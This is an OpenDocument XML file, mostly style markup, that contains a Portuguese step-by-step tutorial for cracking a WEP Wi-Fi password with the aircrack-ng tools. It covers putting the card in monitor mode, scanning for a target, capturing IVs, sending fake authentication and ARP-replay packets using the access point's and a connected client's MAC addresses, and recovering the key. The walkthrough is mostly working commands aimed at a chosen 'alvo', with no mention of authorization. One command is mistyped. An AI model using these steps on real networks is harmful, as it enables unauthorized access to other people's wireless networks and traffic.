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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P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666666" fo:letter-spacing="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P4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5" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L7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6" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10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7" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L11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8" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L6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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L8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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L9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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L10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666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#666666" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" fo:background-color="transparent" loext:char-shading-value="0" style:font-weight-asian="bold" style:font-weight-complex="bold" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#666666" fo:letter-spacing="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#555555" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#555555" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:background-color="transparent" loext:char-shading-value="0" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#555555" style:font-name="helvetica neue" fo:font-size="9pt" fo:letter-spacing="normal" fo:font-style="normal" fo:font-weight="bold" fo:background-color="transparent" loext:char-shading-value="0" style:font-weight-asian="bold" style:font-weight-complex="bold" loext:padding="0cm" loext:border="none"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#555555" fo:letter-spacing="normal" fo:background-color="transparent" loext:char-shading-value="0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39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39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39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39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39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39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39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39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39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39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39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82097997973537355" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T1">Primeiramente iremos colocar a interface de rede em modo </text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">PROMISCUO</text:span></text:span><text:span text:style-name="T1"> (monitor), O comando a ser usado é:</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">airmon-ng start wlan0 </text:span></text:span></text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T3">→ “aqui é importante verificar qual a sua interface de rede”</text:span></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Após executar esse comando será criada uma interface de rede com a nomenclatura “mon0”, essa interface será responsável por capturar todos os pacotes que precisamos para descriptografar a senha</text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">wep ou wpa</text:span></text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T5">Obs:</text:span></text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">Você não poderá estar conectado em nenhuma rede sem fio nesse momento.</text:span></text:span></text:p>
      <text:list xml:id="list826496301864724341" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P8">Agora iremos escanear todas as redes disponíveis;</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Com o comando a seguir iremos ver todas os dispositivos de rede sem fio ao alcance da nossa interface de rede. É possível também ver os </text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1">mac-address</text:span></text:span><text:span text:style-name="T1"> que estão conectados a um determinado dispositivo, assim, é preciso anotar os seguintes dado sobre o nosso alvo: BSSID, CANAL, CIPHER AUTH e ESSID. É preciso também anotar um mac-address que esteja conectado ao alvo escolhido.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">airodump-ng mon0</text:span></text:span></text:span></text:p>
      <text:p text:style-name="P2">com esse comando teremos a seguinte tela:</text:p>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="Figura1" text:anchor-type="as-char" svg:width="15.875cm" svg:height="11.589cm" draw:z-index="0"><draw:image xlink:href="http://trainingtecnologia.com.br/wp-content/uploads/2013/11/tela1.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:list xml:id="list587463253486868024" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P9">Nesse passo iremos capturar os vetores de inicialização:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T5">Obs:</text:span></text:span></text:span><text:span text:style-name="Emphasis"><text:span text:style-name="T1"> No comando a serguir iremos capturar pacotes IVS que trafegam na rede. O nome do arquivo a ser gerado é você quem define, e o canal é o canal do alvo que você definiu.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7">airdump-ng – -ivs -w capturar-ivs-redesegura -c 6 mon0</text:span></text:span></text:p>
      <text:list xml:id="list682674365729460556" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P10">-i = Capturar apenas pacotes que contenham Ivs (–ivs);</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P10">-w = Prefixo do arquivo que será gerado com os dados capturados;</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P10">-c = Canal;</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P10">mon0 = interface de rede em modo promiscuo.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"><text:soft-page-break/><draw:frame draw:style-name="fr1" draw:name="Figura2" text:anchor-type="as-char" svg:width="15.875cm" svg:height="9.922cm" draw:z-index="1"><draw:image xlink:href="http://trainingtecnologia.com.br/wp-content/uploads/2013/11/tela2.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:list xml:id="list8483469188469020701" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P11">Agora iremos enviar um pedido de falsa autenticação com um mac associado ao acces point que queremos quebrar a senha:</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">aireplay-ng -1 0 -e rede-segura -a 00:13:46:18:c9:58 -h 00:1f:3b:92:d1:df mon0</text:span></text:span></text:span></text:p>
      <text:list xml:id="list2302865260648418906" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P12">-1 = Essa opção enviao ao nosso alvo uma autenticação falsa;</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">0 = Aqui temos o tempo para reassociação, em segundos</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">-e = ESSID do alvo, ou seja, o nome do access point</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">-a = Mac-Address do Access Point alvo</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">-h = Mac-Address de alguém que esteja conectado (associado) ao access Point</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P12">mon0 = interface de rede em modo promiscuo.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="Figura3" text:anchor-type="as-char" svg:width="15.875cm" svg:height="9.922cm" draw:z-index="2"><draw:image xlink:href="http://trainingtecnologia.com.br/wp-content/uploads/2013/11/tela3.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P2">Feito isso é só aguardar que os vetores sejam capturados, porem para acelerar esse processo de captura de IVS, podemos tentar enviar um Arp request para a rede, na tentativa que alguma maquina receba e comece a enviar arp replay para nós. Isso fará com que o tráfego de dados aumente rapidamente:</text:p>
      <text:list xml:id="list2087969030716557648" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P5"><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1">Enviando Arp request para a rede:</text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">aireplay-ng -3 -b 00:13:46:18:c9:58 -h 00:1f:3b:92:d1:df mon0</text:span></text:span></text:span></text:p>
      <text:list xml:id="list6304453611925920331" text:style-name="L8">
        <text:list-item>
          <text:p text:style-name="P13">-3 = Opção para arp request;</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">-b = Mac-Address do Access Point alvo</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">-h = Mac-Address associado ao access Point, no nosso caso o mac que identificamos como conectado ao AP rede-segura</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P13">mon0 = interface de rede em modo promiscuo.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"><draw:frame draw:style-name="fr1" draw:name="Figura4" text:anchor-type="as-char" svg:width="15.875cm" svg:height="9.922cm" draw:z-index="3"><draw:image xlink:href="http://trainingtecnologia.com.br/wp-content/uploads/2013/11/tela4.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Emphasis"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T5">Obs: </text:span></text:span></text:span><text:span text:style-name="T1">Pode acontecer de não conectar, você deve insistir algumas vezes ou várias.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T1"/></text:span></text:p>
      <text:list xml:id="list8601092573782257534" text:style-name="L9">
        <text:list-item>
          <text:p text:style-name="P14">Após alguns minutos de captura de pacotes (lembrar que só é possível capturar pacotes se tivermos pessoas trafego de dados na rede) iremos analisar o arquivos gerado e tentar extrair a senha do Dispositivo.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T7">aircrack-ng -a 1 capturar-ivs-redesegura</text:span></text:span></text:p>
      <text:list xml:id="list7278067304044754504" text:style-name="L10">
        <text:list-item>
          <text:p text:style-name="P6"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T4">–</text:span></text:span><text:span text:style-name="T1">a = Modo para forçar o ataque</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P15">-1 = wep (se fosse WPA usaríamos o -2)</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"><text:soft-page-break/><draw:frame draw:style-name="fr1" draw:name="Figura5" text:anchor-type="as-char" svg:width="15.875cm" svg:height="9.922cm" draw:z-index="4"><draw:image xlink:href="http://trainingtecnologia.com.br/wp-content/uploads/2013/11/tela5.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:list xml:id="list7383606110741685015" text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P7"><text:span text:style-name="Emphasis"><text:span text:style-name="T1">Aqui iremos selecionar a nossa rede alvo, pois os dados foram capturados por canal, assim todos as redes que estão no canal “6” entram no aquivo</text:span></text:span><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="Emphasis"><text:span text:style-name="T1">.</text:span></text:span></text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T5">Feito isso a senha cai no nosso colo, veja a tela abaixo:</text:span></text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T8"><draw:frame draw:style-name="fr1" draw:name="Figura6" text:anchor-type="as-char" svg:width="15.875cm" svg:height="9.922cm" draw:z-index="5"><draw:image xlink:href="http://trainingtecnologia.com.br/wp-content/uploads/2013/11/tela6.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame>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so </meta:initial-creator>
    <meta:creation-date>2017-06-22T15:42:19.454941055</meta:creation-date>
    <dc:date>2017-06-22T16:04:57.443938249</dc:date>
    <dc:creator>Adso </dc:creator>
    <meta:editing-duration>PT3M20S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="6" meta:object-count="0" meta:page-count="4" meta:paragraph-count="43" meta:word-count="560" meta:character-count="3142" meta:non-whitespace-character-count="2642"/>
    <meta:generator>LibreOffice/5.0.3.2$Linux_X86_64 LibreOffice_project/00m0$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>